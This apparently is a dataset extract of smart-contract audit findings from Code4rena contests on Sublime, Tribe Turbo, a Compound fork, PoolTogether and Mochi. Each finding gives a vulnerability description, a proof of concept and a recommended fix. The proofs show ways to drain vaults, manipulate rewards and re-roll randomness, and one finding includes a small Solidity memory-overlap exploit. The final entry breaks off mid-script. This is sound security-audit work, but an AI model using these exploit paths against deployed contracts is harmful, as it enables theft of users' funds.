Note: the usage of `approve()` in yield/CompoundYield.sol ([lines 211-212](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/CompoundYield.sol#L211-L212)), in yield/YearnYield.sol ([lines 211-212](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/YearnYield.sol#L210-L211)), and in yield/AaveYield.sol ([lines 297-298](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L297-L298)) do not need modification since it they already use the recommended approach. Additionally the usage of `approve()` in [yield/AaveYield.sol:307](https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/yield/AaveYield.sol#L307) likely does not need modification since that approve function only handles ETH.

#### Recommended Mitigation Steps

Use `approve(_spender, 0)` to set the allowance to zero immediately before each of the existing `approve()` calls."
92.md,ERC4626 mint uses wrong `amount`,high,"> The docs/video say `ERC4626.sol` is in scope as its part of `TurboSafe`

The `ERC4626.mint` function mints `amount` instead of `shares`.
This will lead to issues when the `asset <> shares` are not 1-to-1 as will be the case for most vaults over time.
Usually, the asset amount is larger than the share amount as vaults receive asset yield.
Therefore, when minting, `shares` should be less than `amount`.
Users receive a larger share amount here which can be exploited to drain the vault assets.

```solidity
function mint(uint256 shares, address to) public virtual returns (uint256 amount) {
    amount = previewMint(shares); // No need to check for rounding error, previewMint rounds up.

    // Need to transfer before minting or ERC777s could reenter.
    asset.safeTransferFrom(msg.sender, address(this), amount);
    _mint(to, amount);

    emit Deposit(msg.sender, to, amount, shares);

    afterDeposit(amount, shares);
}
```

### Proof of Concept

Assume `vault.totalSupply() = 1000`, `totalAssets = 1500`

*   call `mint(shares=1000)`. Only need to pay `1000` asset amount but receive `1000` shares => `vault.totalSupply() = 2000`, `totalAssets = 2500`.
*   call `redeem(shares=1000)`. Receive `(1000 / 2000) * 2500 = 1250` amounts. Make a profit of `250` asset tokens.
*   repeat until `shares <> assets` are 1-to-1

### Recommended Mitigation Steps

In `deposit`:

```diff
function mint(uint256 shares, address to) public virtual returns (uint256 amount) {
-    _mint(to, amount);
+    _mint(to, shares);
}
```




***"
92.md,"TurboRouter: `deposit()`, `mint()`, `createSafeAndDeposit()` and `createSafeAndDepositAndBoost()` functions do not work",high,"The TurboRouter contract inherits from the ERC4626RouterBase contract. When the user calls the deposit, mint, createSafeAndDeposit and createSafeAndDepositAndBoost functions of the TurboRouter contract, the deposit and mint functions of the ERC4626RouterBase contract are called.
```solidity
function deposit(IERC4626 safe, address to, uint256 amount, uint256 minSharesOut) 
    public 
    payable 
    override 
    authenticate(address(safe)) 
    returns (uint256) 
{
    return super.deposit(safe, to, amount, minSharesOut);
}
...
function deposit(
    IERC4626 vault, 
    address to,
    uint256 amount,
    uint256 minSharesOut
) public payable virtual override returns (uint256 sharesOut) {
    if ((sharesOut = vault.deposit(amount, to)) < minSharesOut) {
        revert MinAmountError();
    }
}
```

The deposit and mint functions of the ERC4626RouterBase contract will call the deposit and mint functions of the TurboSafe contract. The TurboSafe contract inherits from the ERC4626 contract, that is, the deposit and mint functions of the ERC4626 contract will be called.

The deposit and mint functions of the ERC4626 contract will call the safeTransferFrom function. Since the caller is the TurboRouter contract, msg.sender will be the TurboRouter contract. And because the user calls the deposit, mint, createSafeAndDeposit, and createSafeAndDepositAndBoost functions of the TurboRouter contract without transferring tokens to the TurboRouter contract and approving the TurboSafe contract to use the tokens, the call will fail.
```solidity
function deposit(uint256 amount, address to) public virtual returns (uint256 shares) {
    // Check for rounding error since we round down in previewDeposit.
    require((shares = previewDeposit(amount)) != 0, ""ZERO_SHARES"");

    // Need to transfer before minting or ERC777s could reenter.
    asset.safeTransferFrom(msg.sender, address(this), amount);

    _mint(to, shares);

    emit Deposit(msg.sender, to, amount, shares);

    afterDeposit(amount, shares);
}
```

### Proof of Concept

[TurboRouter.sol](https://github.com/code-423n4/2022-02-tribe-turbo/blob/main/src/TurboRouter.sol)

### Recommended Mitigation Steps

In the deposit, mint, createSafeAndDeposit, and createSafeAndDepositAndBoost functions of the TurboRouter contract, add code for the user to transfer tokens and approve the use of tokens in the TurboSafe contract.
For example:

TurboRouter.sol
```solidity
+        IERC20(safe.asset).safeTransferFrom(msg.sender,address(this),amount);
+        IERC20(safe.asset).safeApprove(safe,amount);
    super.deposit(IERC4626(address(safe)), to, amount, minSharesOut);

...

+        IERC20(safe.asset).safeTransferFrom(msg.sender,address(this),amount);
+        IERC20(safe.asset).safeApprove(safe,amount);
    super.mint(safe, to, shares, maxAmountIn);
```





**Please note: the following additional discussions took place approximately 3 weeks after judging and awarding were finalized. As such, this report will leave this finding in its originally assessed risk category as it simply reflects a snapshot in time.**





***"
92.md,`ERC4626RouterBase.withdraw` should use a **max** shares out check,medium,"> The docs/video say `ERC4626RouterBase.sol` is in scope as its part of `TurboRouter`

The `ERC4626RouterBase.withdraw` function withdraws the asset `amount` parameter by burning `shares`.

```solidity
function withdraw(
    IERC4626 vault,
    address to,
    uint256 amount,
    uint256 minSharesOut
) public payable virtual override returns (uint256 sharesOut) {
    // @audit-info from = msg.sender
    if ((sharesOut = vault.withdraw(amount, to, msg.sender)) < minSharesOut) {
        revert MinAmountError();
    }
}
```

It then checks that the burned shares `sharesOut` are not *less* than a `minSharesOut` amount.
However, the user wants to be protected against burning *too many* shares for their specified `amount`, and therefore a `maxSharesBurned` amount parameter should be used.

The user can lose their entire shares due to the wrong check.

> this extends to `TurboRouter.withdraw`

### Proof of Concept

User calls `Router.withdraw(amount=1100, minSharesOut=1000)` to protect against not burning more than `1000` shares for their `1100` asset amount.
However, there's an exploit in the vault which makes the `sharesOut = 100_000`, the entire user's shares.
The check then passes as it only reverts if `100_000 < 1000`.

### Recommended Mitigation Steps

```diff
function withdraw(
    IERC4626 vault,
    address to,
    uint256 amount,
-    uint256 minSharesOut
+    uint256 maxSharesIn
) public payable virtual override returns (uint256 sharesOut) {
-    if ((sharesOut = vault.withdraw(amount, to, msg.sender)) < minSharesOut) {
+    if ((sharesOut = vault.withdraw(amount, to, msg.sender)) > maxSharesIn) {
        revert MinAmountError();
    }
}
```

Also, rename the variable in `TurboRouter.withdraw`.






***"
92.md,Wrong implementation of `TurboSafe.sol#less()` may cause boosted record value in TurboMaster bigger than actual lead to `BoostCapForVault` and `BoostCapForCollateral` to be permanently occupied,medium,"[TurboSafe.sol#L225-L236](https://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/TurboSafe.sol#L225-L236)

```solidity
// Get out current amount of Fei debt in the Turbo Fuse Pool.
uint256 feiDebt = feiTurboCToken.borrowBalanceCurrent(address(this));

// If our debt balance decreased, repay the minimum.
// The surplus Fei will accrue as fees and can be sweeped.
if (feiAmount > feiDebt) feiAmount = feiDebt;

// Repay Fei debt in the Turbo Fuse Pool, unless we would repay nothing.
if (feiAmount != 0) require(feiTurboCToken.repayBorrow(feiAmount) == 0, ""REPAY_FAILED"");

// Call the Master to allow it to update its accounting.
master.onSafeLess(asset, vault, feiAmount);
```

In the current implementation, when calling `less()` to withdraw Fei from the Vault and use it to repay debt, if the amount of Fei is bigger than the debt balance, the `onSafeLess` hook will use `feiDebt` as `The amount of Fei withdrawn from the Vault`.

As a result, `getTotalBoostedForVault[vault]` in TurboMaster will be larger than the actual total amount of Fei being used to boost the Vault.

Since the `Turbo Gibber` may impound some of the Safe's collateral and mint a certain amount of Fei and repay the Safe's Fei debt with the newly minted Fei. In that case, the Safe's debt balance can be less than the amount of Fei in Vault. Which constitutes the precondition for the `less()` call to case the distortion of `getTotalBoostedForVault[vault]`.

### Proof of Concept

Given:

*   1 WBTC = 100,000
*   `collateralFactor` of WBTC = 0.6
*   `getBoostCapForCollateral[WBTC]` = 300,000
*   `getBoostCapForVault[vault0]` = 300,000

1.  Alice create Safe and deposit `10 WBTC` and Boost `300,000 Fei` to `vault0`

*   Safe's debt = 300,000
*   Safe's Fei in vault = 300,000

On master:

*   getTotalBoostedForVault\[vault0] = 300,000
*   getTotalBoostedAgainstCollateral\[WBTC] = 300,000

On safe:

*   getTotalFeiBoostedForVault\[vault0] = 300,000
*   totalFeiBoosted = 300,000

2.  WBTC price drop to 50,000, `Turbo Gibber` impound `2 WBTC` and mint `100,000 Fei` to repay debt for Alice's Safe.

*   Safe's debt = 200,000
*   Safe's Fei in vault0 = 300,000

3.  Alice call `less()` withdraw `300,000 Fei` from Vault and repay `200,000` debt, in the hook: `master.onSafeLess(WBTC, vault0, 200,000)`

*   Safe's debt = 0
*   Safe's Fei in vault = 0

On master:

*   getTotalBoostedForVault\[vault0] = 100,000
*   getTotalBoostedAgainstCollateral\[WBTC] = 100,000

On Safe:

*   getTotalFeiBoostedForVault\[vault0] = 0
*   totalFeiBoosted = 0

4.  Alice try deposit `20 WBTC` and Boost `300,000 Fei` will fail due to `BOOSTER_REJECTED`.

### Recommended Mitigation Steps

Change to:

```solidity
function less(ERC4626 vault, uint256 feiAmount) external nonReentrant requiresLocalOrMasterAuth {
    // Update the total Fei deposited into the Vault proportionately.
    getTotalFeiBoostedForVault[vault] -= feiAmount;

    unchecked {
        // Decrease the boost total proportionately.
        // Cannot underflow because the total cannot be less than a single Vault.
        totalFeiBoosted -= feiAmount;
    }

    emit VaultLessened(msg.sender, vault, feiAmount);

    // Withdraw the specified amount of Fei from the Vault.
    vault.withdraw(feiAmount, address(this), address(this));

    // Call the Master to allow it to update its accounting.
    master.onSafeLess(asset, vault, feiAmount);

    // Get out current amount of Fei debt in the Turbo Fuse Pool.
    uint256 feiDebt = feiTurboCToken.borrowBalanceCurrent(address(this));

    // If our debt balance decreased, repay the minimum.
    // The surplus Fei will accrue as fees and can be sweeped.
    if (feiAmount > feiDebt) feiAmount = feiDebt;

    // Repay Fei debt in the Turbo Fuse Pool, unless we would repay nothing.
    if (feiAmount != 0) require(feiTurboCToken.repayBorrow(feiAmount) == 0, ""REPAY_FAILED"");
}
```





***"
92.md,Slurp can be frontrun with fee increase,medium,"The `TurboSafe.slurp` function fetches the current fee from the `clerk()`.
This fee can be changed.
The `slurp` transaction can be frontrun with a fee increase (specifically targeted for the vault or the asset) by the clerk and steal the vault yield that should go to the user.

Maybe the user would not want to `slurp` at the new fee rate and would rather wait as they expect the fees to decrease again in the future.
Or they would rather create a new vault if the default fees are lower.

### Recommended Mitigation Steps

Right now there's no good protection against this as the master can call `slurp` at any time.
(They could even increase the fees to 100%, slurp, reset the fees.)
This mechanic would need to be addressed first if mitigation and better user protection are desired.





***"
92.md,ERC4626 does not work with fee-on-transfer tokens,medium,"> The docs/video say `ERC4626.sol` is in scope as its part of `TurboSafe`

The `ERC4626.deposit/mint` functions do not work well with fee-on-transfer tokens as the `amount` variable is the pre-fee amount, including the fee, whereas the `totalAssets` do not include the fee anymore.

This can be abused to mint more shares than desired.

```solidity
function deposit(uint256 amount, address to) public virtual returns (uint256 shares) {
    // Check for rounding error since we round down in previewDeposit.
    require((shares = previewDeposit(amount)) != 0, ""ZERO_SHARES"");

    // Need to transfer before minting or ERC777s could reenter.
    asset.safeTransferFrom(msg.sender, address(this), amount);

    _mint(to, shares);

    emit Deposit(msg.sender, to, amount, shares);

    afterDeposit(amount, shares);
}
```

### Proof of Concept

A `deposit(1000)` should result in the same shares as two deposits of `deposit(500)` but it does not because `amount` is the pre-fee amount.
Assume a fee-on-transfer of `20%`. Assume current `totalAmount = 1000`, `totalShares = 1000` for simplicity.

*   `deposit(1000) = 1000 / totalAmount * totalShares = 1000 shares`
*   `deposit(500) = 500 / totalAmount * totalShares = 500 shares`. Now the `totalShares` increased by 500 but the `totalAssets` only increased by `(100% - 20%) * 500 = 400`. Therefore, the second `deposit(500) = 500 / (totalAmount + 400) * (newTotalShares) = 500 / (1400) * 1500 = 535.714285714 shares`.

In total, the two deposits lead to `35` more shares than a single deposit of the sum of the deposits.

### Recommended Mitigation Steps

`amount` should be the amount excluding the fee, i.e., the amount the contract actually received.
This can be done by subtracting the pre-contract balance from the post-contract balance.
However, this would create another issue with ERC777 tokens.

Maybe `previewDeposit` should be overwritten by vaults supporting fee-on-transfer tokens to predict the post-fee `amount`. And do the shares computation on that, but then the `afterDeposit` is still called with the original `amount` and implementers need to be aware of this.





***"
92.md,Gibber can take any amount from safes,medium,"Although Gibber is supposed to behind governance timelock, there are still significant ""rug risk"" when such privillaged user can remove all fund from a vault unconditionally.

### Proof of Concept

[TurboSafe.sol#L335](https://github.com/code-423n4/2022-02-tribe-turbo/blob/66f27fe51083f49f7935e3fe594ab2380b75dee8/src/TurboSafe.sol#L335)<br>
```solidity
function gib(address to, uint256 assetAmount) external nonReentrant requiresLocalOrMasterAuth {
    emit SafeGibbed(msg.sender, to, assetAmount);

    // Withdraw the specified amount of assets from the Turbo Fuse Pool.
    require(assetTurboCToken.redeemUnderlying(assetAmount) == 0, ""REDEEM_FAILED"");

    // Transfer the assets to the authorized caller.
    asset.safeTransfer(to, assetAmount);
}
```

### Recommended Mitigation Steps

Limit gib to certain collateral ratio.





***"
7.md,UniswapConfig getters return wrong token config if token config does not exist,high,"The `UniswapConfig.getTokenConfigBySymbolHash` function does not work as `getSymbolHashIndex` returns `0` if there is no config token for that symbol (uninitialized map value), but the outer function implements the non-existence check with `-1`.

The same issue occurs also for:

- `getTokenConfigByCToken`
- `getTokenConfigByUnderlying`

When encountering a non-existent token config, it will always return the token config of the **first index** (index 0) which is a valid token config for a completely different token.

This leads to wrong oracle prices for the actual token which could in the worst case be used to borrow more tokens at a lower price or borrow more tokens by having a higher collateral value, essentially allowing undercollateralized loans that cannot be liquidated.

Recommend fixing the non-existence check.


 <br />"
7.md,uint(-1) index for not found,high,"Functions `getTokenConfigBySymbolHash`, `getTokenConfigByCToken` and `getTokenConfigByUnderlying` check returned index against max uint:
index != uint(-1)

-1 should indicate that the index is not found, however, a default value for an uninitialized uint is 0, so it is impossible to get -1. What is even weirder is that 0 will be returned for non-existing configs but 0 is a valid index for the 1st config.

One of the solutions would be to reserve 0 for a not found index and use it when searching in mappings. Then normal indexes should start from 1. Another solution would be to introduce a new mapping with a boolean value that indicates if this index is initialized or not but this may be a more gas costly way.


<br /><br />"
7.md,Reward rates can be changed through flash borrows,medium,"The rewards per market are proportional to their `totalBorrows` which can be changed by a large holder who deposits lots of collateral, takes out a huge borrow in the market, updates the rewards, and then unwinds the position.
They'll only pay gas fees as the borrow / repay can happen in the same block.

The `Comptroller.refreshCompSpeeds` function only checks that the single transaction is called from an EOA, but miners (or anyone if a miner offers services like flash bundles for flashbots) can still run flash-loan-like attacks by first sending a borrow tx increasing the totalBorrows, then the `refreshCompSpeeds` transaction, and then the repay of the borrow, as miners have full control over the transaction order of the block.

The new rate will then persist until the next call to `refreshCompSpeeds`.

Attackers have an incentive to drive up the rewards in markets they are a large supplier/borrower in.

The increased rewards that the attacker receives are essentially stolen from other legitimate users.

Recommend making it an admin-only function or use a time-weighted total borrow system similar to Uniswap's price oracles.


<br /><br />"
7.md,No account existence check for low-level call in CEther.sol,low,"Low-level calls call/delegatecall/staticcall return true even if the account called is non-existent (per EVM design). Account existence must be checked prior to calling.

The `doTransferOut()` function was changed from using a `transfer()` function (which reverts) to a `call()` function (which returns a boolean), however there is no account existence check for the destination address to. If it doesn’t exist, for some reason, `call` will still return true (not throw an exception) and successfully pass the return value check on the next line.

The checked call paths don’t seem vulnerable because they use `msg.sender/admin` and not a user-controlled address, but this may be a risk if used later in other contexts. Hence rating as low-risk.

For reference, see this related [high-risk severity finding](https://github.com/trailofbits/publications/blob/master/reviews/hermez.pdf) from Trail of Bit’s audit of Hermez Network.

Recommend checking for account-existence before the `call()` to make this safely extendable to user-controlled address contexts in future.


<br />"
7.md,sweepToken() function removed in CErc20.sol from original Compound code,low,"The `sweepToken()` function in the original Compound code whose specified purpose was to recover accidentally sent ERC20 tokens to contract has been removed.

The original code comment says: “A public function to sweep accidental ERC-20 transfers to this contract. Tokens are sent to admin (timelock).” This safety measure is helpful given the number/value of accidentally stuck tokens that are sent to contracts by mistake.

Tokens accidentally sent to this contract will be stuck leading to fund loss for sender.

Recommend retaining this function unless there is a specific reason to remove it here.

### Comments:


<br />"
7.md,All except one Comptroller verify functions do not verify anything in Comptroller.sol/CToken.sol,low,"Six of the seven Comptroller verify functions do nothing. Not sure why their calls in CToken.sol have been uncommented from the original Compound version.

Except `redeemVerify()`, six other verify functions `transferVerify()`, `mintVerify()`, `borrowVerify()`, `repayBorrowVerify()`, `liquidateBorrowVerify()` and `seizeVerify()` have no logic except accessing state variables to not be marked pure. Calls to these functions were commented out in the original Compound code’s CToken.sol but have been uncommented here.

Given that they do not implement any logic, the protocol should not be making any assumptions about any defence provided from their unimplemented verification logic.

There are a number of dummy functions whose comments say “// Shh - currently unused”.

Recommend adding logic to implement verification if that is indeed assumed to be implemented but is actually not. Otherwise, comment call sites.


<br />"
7.md,Floating pragma used in Uniswap\*.sol,low,"Contracts should be deployed using the same compiler version/flags with which they have been tested. Locking the floating pragma, i.e. by not using ^ in pragma solidity ^0.6.10, ensures that contracts do not accidentally get deployed using an older compiler version with unfixed bugs.

For reference, see https://swcregistry.io/docs/SWC-103

Recommend removing ^ in “pragma solidity ^0.6.10” and change it to “pragma solidity 0.6.12” to be consistent with the rest of the contracts.


<br />"
7.md,Missing input validation may set COMP token to zero-address in Comptroller.sol,low,"Function `_setCompAddress()` is used by admin to change the COMP token address. However, there is no zero-address validation on the parameter. This may accidentally set COMP token address to zero-address but it can be reset by the admin. Any interim transactions might hit exceptional behavior.

Recommend adding zero-address check to `_comp` parameter of `_setCompAddress()`.


<br />"
7.md,Missing zero/threshold check for maxAssets,low,"A zero or some minimum threshold check is missing for `newMaxAssets` parameter of `_setMaxAssets()` function which is used by admin to set the maximum number of assets that controls how many markets can be entered.

If accidentally set to 0 then all users cannot enter any market which will significantly affect protocol operations.

Recommend adding zero/threshold check to `newMaxAssets` parameter.



<br />"
7.md,Usage of `address.transfer`,low,"The `transfer` function is used in `Maximillion.sol` to send ETH to an account.

It is performed with a fixed amount of GAS and might fail if GAS costs change in the future or if a smart contract's fallback function handler is complex.

Consider using the lower-level `.call{value: value}` instead and checking its success return value.


<br />"
7.md,Unbounded iteration on `refreshCompSpeedsInternal`,low,"The `Comptroller.refreshCompSpeedsInternal` function iterates over all markets and does expensive computations like updating all borrower / supply indices.

When the total number of markets is high, this iteration could exceed the total block gas amount breaking the functionality and making it impossible to update the reward distribution speed.

Keep the number of markets low and/or adjust the function to be processable in several transactions.



<br />"
7.md,uint[] memory parameter is tricky,low,"Using memory array parameters (e.g. uint[] memory) as function parameters can be tricky in Solidity, because an attack is possible with a very large array which will overlap with other parts of the memory. See proof of concept below.

The function `propose` of GovernorAlpha.sol seems most vulnerable because this function does not check the validity of the array lengths.

Most other functions do a loop over the array, which will fail with a large array (due to out of gas).

The following functions use a [] memory parameter:

- .\Comptroller.sol: `enterMarkets`, `claimComp`, `claimComp`, `_addCompMarkets`
- .\Governance\GovernorAlpha.sol: `propose`
- .\UniswapOracle\UniswapAnchoredView.sol: `addTokens`
- .\UniswapOracle\UniswapConfig.sol: `_addTokensInternal`

This an example to show the exploit:

```solidity
// based on https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol

pragma solidity ^0.4.24; // only works with low solidity version

contract test{
    struct Overlap {
        uint field0;
    }
    event log(uint);

  function mint(uint[] memory amounts) public  returns (uint) {   // this can be in any solidity version
       Overlap memory v;
       v.field0 = 1234;
       emit log(amounts[0]); // would expect to be 0 however is 1234
       return 1;
     }

  function go() public { // this part requires the low solidity version
      uint x=0x800000000000000000000000000000000000000000000000000000000000000; // 2^251
      bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, x);
      bool success=address(this).call(payload);
  }
}
```

Recommend adding checks on the size of the array parameters to make sure they are not absurdly long.


<br />"
7.md,CarefulMath / safe math not allways used,low,"CarefulMath is used in most calculations, however it isn't always used.

Recommend double checking to see if safe math functions really are not necessary and otherwise add a comment.



<br />"
7.md,Use 'receive' when expecting eth and empty call data,low,"Contract CEther fallback function was refactored to be compatible with the Solidity 0.6 version:

```solidity
/**
* @notice Send Ether to CEther to mint
*/
fallback () external payable {
    (uint err,) = mintInternal(msg.value);
    requireNoError(err, ""mint failed"");
}
```

From Solidity 0.6 documentation:

> ""The unnamed function commonly referred to as “fallback function” was split up into a new fallback function that is defined using the fallback keyword and a receive ether function defined using the receive keyword. If present, the receive ether function is called whenever the call data is empty (whether or not ether is received). This function is implicitly payable. The new fallback function is called when no other function matches (if the receive ether function does not exist then this includes calls with empty call data). You can make this function payable or not. If it is not payable then transactions not matching any other function which send value will revert. You should only need to implement the new fallback function if you are following an upgrade or proxy pattern.""

In this case, ""receive"" may be more suitable as the function is expecting to receive ether and empty call data.

Recommend replacing ""fallback"" with ""receive"".


<br />"
7.md,Allow borrowCap to be filled fully,low,"Here the condition should be '<=', not '<' to allow filling the cap fully:

```solidity
require(nextTotalBorrows < borrowCap, ""market borrow cap reached"");

require(nextTotalBorrows <= borrowCap, ""market borrow cap reached"");
```


<br /><br />"
34.md,The formula of number of prizes for a degree is wrong,high,".

The formula of the number of prizes for a degree per the document: <https://v4.docs.pooltogether.com/protocol/concepts/prize-distribution/#splitting-the-prizes> is:

    Number of prizes for a degree = (2^bit range)^degree - (2^bit range)^(degree-1) - (2^bit range)^(degree-2) - ...

Should be changed to:

    Number of prizes for a degree = (2^bit range)^degree - (2^bit range)^(degree-1)

or

    Number of prizes for a degree = 2^(bit range * degree) - 2^(bit range * (degree-1))

##### Impact

Per the document:

> prize for a degree = total prize \* degree percentage / number of prizes for a degree

Due to the miscalculation of `number of prizes for a degree`, it will be smaller than expected, as a result, `prize for a degree` will be larger than expected. Making the protocol giving out more prizes than designed.

##### Proof

> We will use `f(bitRange, degree)` to represent `numberOfPrizesForDegree(bitRangeSize, degree)`.

###### Proof: (method 1)

```tex
2 ^ {bitRange \times n} = f(bitRange, n) + f(bitRange, n-1) + f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0)
f(bitRange, n) = 2 ^ {bitRange \times n} - ( f(bitRange, n-1) + f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0) )
f(bitRange, n) = 2 ^ {bitRange \times n} - f(bitRange, n-1) - ( f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0) )

Because:

2 ^ {bitRange \times (n-1)} = f(bitRange, n-1) + f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0)
2 ^ {bitRange \times (n-1)} - f(bitRange, n-1) = f(bitRange, n-2) + ... + f(bitRange, 1) + f(bitRange, 0)

Therefore:

f(bitRange, n) = 2 ^ {bitRange \times n} - f(bitRange, n-1) - ( 2 ^ {bitRange \times (n-1)} - f(bitRange, n-1) )
f(bitRange, n) = 2 ^ {bitRange \times n} - f(bitRange, n-1) - 2 ^ {bitRange \times (n-1)} + f(bitRange, n-1)
f(bitRange, n) = 2 ^ {bitRange \times n} - 2 ^ {bitRange \times (n-1)}
```

Because `2^x = 1 << x`

Therefore, when `n > 0`:

    f(bitRange, n) = ( 1 << bitRange * n ) - ( 1 << bitRange * (n - 1) )

QED.

###### Proof: (method 2)

By definition, `degree n` is constructed by 3 chunks:

*   The first N numbers, must equal the matching numbers. Number of possible values: `1`;
*   The N-th number, must not equal the N-th matching number. Number of possible values: `2^bitRange - 1`
*   From N (not include) until the end. Number of possible values: `2 ^ (bitRange * (n-1))`

Therefore, total `numberOfPrizesForDegree` will be:

```tex
f(bitRange, n) = (2 ^ {bitRange} - 1) \times 2 ^ {bitRange \times (n - 1)}
f(bitRange, n) = 2 ^ {bitRange} \times 2 ^ {bitRange \times (n - 1)} - 2 ^ {bitRange \times (n - 1)}
f(bitRange, n) = 2 ^ {bitRange + bitRange \times (n - 1)} - 2 ^ {bitRange \times (n - 1)}
f(bitRange, n) = 2 ^ {bitRange + bitRange \times n - bitRange} - 2 ^ {bitRange \times (n - 1)}
f(bitRange, n) = 2 ^ {bitRange \times n} - 2 ^ {bitRange \times (n - 1)}
```

QED.

##### Recommendation

<https://github.com/pooltogether/v4-core/blob/055335bf9b09e3f4bbe11a788710dd04d827bf37/contracts/DrawCalculator.sol#L423-L431>

```solidity
/**
    * @notice Calculates the number of prizes for a given prizeDistributionIndex
    * @param _bitRangeSize Bit range size for Draw
    * @param _prizeTierIndex Index of the prize tier array to calculate
    * @return returns the fraction of the total prize (base 1e18)
    */
function _numberOfPrizesForIndex(uint8 _bitRangeSize, uint256 _prizeTierIndex)
    internal
    pure
    returns (uint256)
{
    uint256 bitRangeDecimal = 2**uint256(_bitRangeSize);
    uint256 numberOfPrizesForIndex = bitRangeDecimal**_prizeTierIndex;

    while (_prizeTierIndex > 0) {
        numberOfPrizesForIndex -= bitRangeDecimal**(_prizeTierIndex - 1);
        _prizeTierIndex--;
    }

    return numberOfPrizesForIndex;
}
```

L423-431 should change to:

```solidity
if (_prizeTierIndex > 0) {
    return ( 1 << _bitRangeSize * _prizeTierIndex ) - ( 1 << _bitRangeSize * (_prizeTierIndex - 1) );
} else {
    return 1;
}
```

BTW, the comment on L416 is wrong:

*   seems like it's copied from `\_calculatePrizeTierFraction()`
*   plus, it's not base 1e18 but base 1e9"
34.md,Miners Can Re-Roll the VRF Output to Game the Protocol,high,".

#### Impact

Miners are able to rewrite a chain's history if they dislike the VRF output used by the protocol. Consider the following example:

*   A miner or well-funded user is participating in the PoolTogether protocol.
*   A VRF request is made and fulfilled in the same block.
*   The protocol participant does not benefit from the VRF output and therefore wants to increase their chances of winning by including the output in another block, producing an entirely new VRF output. This is done by re-orging the chain, i.e. following a new canonical chain where the VRF output has not been included in a block.
*   This attack can be continued as long as the attacker controls 51% of the network. The miner itself could control a much smaller proportion of the network and still be able to mine a few blocks in succession, although this is of low probability but entirely possible.
*   A well-funded user could also pay miners to re-org the chain on their behalf in the form of MEV to achieve the same benefit.

The PoolTogether team is aware of this issue but is yet to mitigate this attack vector fully.

#### Proof of Concept

- <https://docs.chain.link/docs/vrf-security-considerations/#choose-a-safe-block-confirmation-time-which-will-vary-between-blockchains>
- <https://github.com/pooltogether/pooltogether-rng-contracts/blob/master/contracts/RNGChainlink.sol>
- <https://github.com/pooltogether/v4-core/blob/master/contracts/DrawBeacon.sol#L311-L324>
- <https://github.com/pooltogether/v4-core/blob/master/contracts/DrawBeacon.sol#L218-L232>
- <https://github.com/pooltogether/blockhash-analysis-simulation>

#### Tools Used

- Manual code review
- Discussions with Brendan

#### Recommended Mitigation Steps

Consider adding a confirmation time between when the actual VRF request was made and when it was later fulfilled on-chain. This could be as few as 5 blocks, reducing the probability of an effective chain reorganization to extremely close to 0."
34.md,Deposits don't work with fee-on transfer tokens,medium,".

There are ERC20 tokens that may make certain customizations to their ERC20 contracts.
One type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.
Others are rebasing tokens that increase in value over time like Aave's aTokens (`balanceOf` changes over time).

#### Impact

The `PrizePool._depositTo()` function will try to supply more `_amount` than was actually transferred.
The tx will revert and these tokens cannot be used.

#### Recommended Mitigation Steps

One possible mitigation is to measure the asset change right before and after the asset-transferring routines"
34.md,`PrizePool.awardExternalERC721()` Erroneously Emits Events,medium,".

#### Impact

The `awardExternalERC721()` function uses solidity's try and catch statement to ensure a single tokenId cannot deny function execution. If the try statement fails, an `ErrorAwardingExternalERC721` event is emitted with the relevant error, however, the failed tokenId is not removed from the list of tokenIds emitted at the end of function execution. As a result, the `AwardedExternalERC721` is emitted with the entire list of tokenIds, regardless of failure.  An off-chain script or user could therefore be tricked into thinking an ERC721 tokenId was successfully awarded.

#### Proof of Concept

<https://github.com/pooltogether/v4-core/blob/master/contracts/prize-pool/PrizePool.sol#L250-L270>

#### Tools Used

Manual code review

#### Recommended Mitigation Steps

Consider emitting only successfully transferred tokenIds in the `AwardedExternalERC721` event."
42.md,Vault fails to track debt correctly that leads to bad debt,high,"#### Impact
It's similar to the issue ""misuse amount as increasing debt in the vault contract"".
Similar issue in a different place that leads to different exploit patterns and severity.

When users borrow usdm from a vault, the debt increases by the amount \* 1.005.

```solidity
    uint256 increasingDebt = (_amount * 1005) / 1000;
```

However, when the contract records the total debt it uses `_amount` instead of `increasingDebt`.

```solidity
details[_id].debtIndex =
    (details[_id].debtIndex * (totalDebt)) /
    (details[_id].debt + _amount);
details[_id].debt = totalDebt;
details[_id].status = Status.Active;
debts += _amount;
```

[MochiVault.sol L242-L249](https://github.com/code-423n4/2021-10-mochi/blob/main/projects/mochi-core/contracts/vault/MochiVault.sol#L242-L249)

The contract's debt is inconsistent with the total sum of all users' debt. The bias increases overtime and would break the vault at the end.

For simplicity, we assume there's only one user in the vault.
Example:

1.  User deposits 1.2 M worth of BTC and borrows 1M USDM.
2.  The user's debt (`details[_id].debt`) would be 1.005 M as there's a .5 percent fee.
3.  The contract's debt is 1M.
4.  BTC price decrease by 20 percent
5.  The liquidator tries to liquidate the position.
6.  The liquidator repays 1.005 M and the contract tries to sub the debt by 1.005 M
7.  The transaction is reverted as `details[_id].debt -= _usdm;` would raise exception.

inaccurate accounting would lead to serious issues. I consider this a high-risk issue.

#### Proof of Concept
This is a web3.py script that a liquidation may fail.

```python
deposit_amount = 10**18
big_deposit = deposit_amount * 100000
minter.functions.mint(user, big_deposit).transact()

dai.functions.approve(vault.address, big_deposit + deposit_amount).transact()"
